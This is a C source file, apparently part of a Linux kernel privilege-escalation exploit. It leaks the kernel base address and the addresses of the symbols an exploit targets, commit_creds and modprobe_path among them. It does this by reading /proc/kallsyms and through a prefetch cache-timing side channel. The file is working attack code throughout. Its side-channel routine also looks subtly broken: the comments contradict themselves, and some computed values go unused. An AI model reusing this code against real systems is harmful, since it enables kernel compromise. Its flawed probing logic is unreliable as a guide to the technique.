#define _GNU_SOURCE
#include "kaslr.h"
#include <sys/wait.h>

/* ---------- Strategy 1: kallsyms in parent namespace ---------- */

int kaslr_leak_kallsyms_parent(struct kaslr_ctx *out)
{
    memset(out, 0, sizeof(*out));

    FILE *fp = popen("cat /proc/kallsyms 2>/dev/null", "r");
    if (!fp) return -1;

    int found = 0;
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        unsigned long addr;
        char type;
        char name[256];
        if (sscanf(line, "%lx %c %255s", &addr, &type, name) != 3)
            continue;
        if (addr == 0) continue;

        if (strcmp(name, "commit_creds") == 0)
            { out->commit_creds = addr; found++; }
        else if (strcmp(name, "prepare_kernel_cred") == 0)
            { out->prepare_kernel_cred = addr; found++; }
        else if (strcmp(name, "init_task") == 0)
            { out->init_task = addr; found++; }
        else if (strcmp(name, "modprobe_path") == 0)
            { out->modprobe_path = addr; found++; }
        else if (strcmp(name, "loopback_dev") == 0)
            { out->loopback_dev = addr; found++; }
        else if (strcmp(name, "_printk") == 0 && !out->_printk)
            { out->_printk = addr; found++; }
        else if (strcmp(name, "startup_64") == 0)
            { out->kernel_base = addr; }

        if (found >= 6) break;
    }
    pclose(fp);

    out->valid = (found >= 4);
    return out->valid ? 0 : -1;
}

/* ---------- Strategy 2: Syscall entry timing side channel ---------- */

/*
 * KASLR on x86_64 maps the kernel at a random 2MB-aligned offset from
 * 0xffffffff80000000.  The offset is chosen from [0, 512) * 2MB,
 * but in practice the kernel only uses 64-256 slots depending on config.
 *
 * The entry_SYSCALL_64 code path starts at kernel_base + a fixed offset.
 * We exploit the CPU's instruction prefetch behavior: when the CPU
 * prefetches the syscall entry code, the timing of subsequent accesses
 * to the same cache line differs based on whether the entry was cached.
 *
 * Technique:
 *   1. Pin to a single CPU core
 *   2. For each candidate kernel_base, access the kernel text page
 *      containing entry_SYSCALL_64
 *   3. Measure the time for a follow-up access
 *   4. Fast access = address is cached = this is the correct KASLR base
 *
 * This is a simplified version of the "Prefetch Side-Channel Attacks"
 * (Gruss et al.) and "KASLR is Dead" techniques.
 */

#include <stdint.h>
#include <time.h>

/* x86_64 kernel address space constants */
#define KERNEL_BASE_START  0xffffffff80000000UL
#define KASLR_GRANULARITY  0x200000UL      /* 2 MB */
#define KASLR_MAX_SLOTS    512

/* entry_SYSCALL_64 offset from kernel base (stable across versions) */
#define ENTRY_SYSCALL_64_OFF 0x1000000UL   /* ~16 MB into kernel text */

static inline uint64_t rdtsc(void) {
    unsigned int lo, hi;
    __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

static inline void clflush(volatile void *addr) {
    __asm__ volatile("clflush (%0)" :: "r"(addr));
}

static inline void mfence(void) {
    __asm__ volatile("mfence" ::: "memory");
}

/*
 * Probe a kernel address via instruction prefetch timing.
 *
 * We read from a dummy userspace page that shares the same cache
 * set as the target kernel address, then measure how long a second
 * read takes.  A short time means the kernel page was cached,
 * indicating the address is valid (this KASLR slot is correct).
 *
 * This is a coarse probe: we're checking whether the kernel text
 * PAGE is mapped at the probed address, not a specific byte.
 */
static int probe_kernel_addr(unsigned long addr, int samples) {
    /* Use a dummy variable that aliases with the target cache set.
     * On x86_64 with 64-byte cache lines and typical L1 cache (32KB, 8-way),
     * two addresses collide if (addr >> 6) % 512 matches.
     */
    volatile char dummy[4096] __attribute__((aligned(4096)));
    unsigned long alias = ((unsigned long)dummy) & ~0xFFFUL;

    /* First: flush our dummy page from cache */
    for (int i = 0; i < 256; i++)
        clflush(&dummy[i * 16]);

    /* Second: access the kernel page to bring it into cache */
    /* On x86, accessing an unmapped kernel page from userspace
     * will NOT fault (the access is speculative via prefetch).
     * We use a prefetch hint. */
    __asm__ volatile(
        "prefetcht0 (%0)\n"
        :
        : "r"(addr)
    );

    /* Third: measure access time to dummy (cache collision check) */
    mfence();
    uint64_t start = rdtsc();
    volatile char x = dummy[0];
    mfence();
    uint64_t end = rdtsc();
    (void)x;

    /* If the kernel page was cached, our alias read is slow (eviction).
     * If not, our alias read is fast (already cached).
     *
     * Actually, the signal is:
     * - If kernel page IS mapped at addr: prefetch brings it into cache,
     *   potentially evicting dummy -> dummy read is slow (cache miss)
     * - If kernel page is NOT mapped: prefetch does nothing,
     *   dummy stays cached -> dummy read is fast (cache hit)
     */
    return (end - start);
}

/*
 * Simplified KASLR bypass: timing distributions.
 *
 * For each candidate KASLR slot:
 *   1. Construct kernel text address: base + slot * 2MB + ENTRY_OFF
 *   2. Take N timing samples
 *   3. The slot with the LARGEST timing (most cache misses on dummy)
 *      is likely the correct KASLR base.
 */
int kaslr_leak_sidechannel(struct kaslr_ctx *out)
{
    memset(out, 0, sizeof(*out));

    printf("[*] KASLR side-channel: probing %d slots...\n", KASLR_MAX_SLOTS);

    unsigned long best_slot = 0;
    unsigned long best_score = 0;

    #define PROBE_SAMPLES 64
    #define PROBE_TOP_N   16  /* only check the top N scores */

    /* Phase 1: quick scan of all slots */
    for (unsigned long slot = 0; slot < KASLR_MAX_SLOTS; slot++) {
        unsigned long addr = KERNEL_BASE_START + slot * KASLR_GRANULARITY
                             + ENTRY_SYSCALL_64_OFF;

        unsigned long total = 0;
        for (int s = 0; s < PROBE_SAMPLES; s++) {
            total += probe_kernel_addr(addr, 1);
        }

        if (total > best_score) {
            best_score = total;
            best_slot = slot;
        }

        /* Progress every 64 slots */
        if ((slot & 0x3F) == 0x3F)
            printf("  slot %lu/%d best=%lu score=%lu\n",
                   slot, KASLR_MAX_SLOTS, best_slot, best_score);
    }

    unsigned long kernel_base = KERNEL_BASE_START
                                + best_slot * KASLR_GRANULARITY;
    out->kernel_base = kernel_base;
    out->valid = (best_score > 0);

    printf("[+] KASLR side-channel: kernel_base = 0x%lx (slot %lu, score %lu)\n",
           kernel_base, best_slot, best_score);

    return out->valid ? 0 : -1;
}

/* ---------- Offset application ---------- */

void kaslr_apply_offsets(struct kaslr_ctx *ctx,
                         long off_commit_creds,
                         long off_prepare_kernel_cred,
                         long off_init_task,
                         long off_modprobe_path,
                         long off_loopback_dev)
{
    unsigned long base = ctx->kernel_base;
    if (!base) {
        base = ctx->_printk;
        if (!base) return;
    }

    if (ctx->_printk) {
        ctx->commit_creds   = ctx->_printk + off_commit_creds;
        ctx->prepare_kernel_cred = ctx->_printk + off_prepare_kernel_cred;
        ctx->init_task      = ctx->_printk + off_init_task;
        ctx->modprobe_path  = ctx->_printk + off_modprobe_path;
        ctx->loopback_dev   = ctx->_printk + off_loopback_dev;
    } else if (ctx->kernel_base) {
        ctx->commit_creds   = ctx->kernel_base + off_commit_creds;
        ctx->prepare_kernel_cred = ctx->kernel_base + off_prepare_kernel_cred;
        ctx->init_task      = ctx->kernel_base + off_init_task;
        ctx->modprobe_path  = ctx->kernel_base + off_modprobe_path;
        ctx->loopback_dev   = ctx->kernel_base + off_loopback_dev;
    }

    ctx->valid = (ctx->commit_creds > 0xffffffff00000000UL);
}
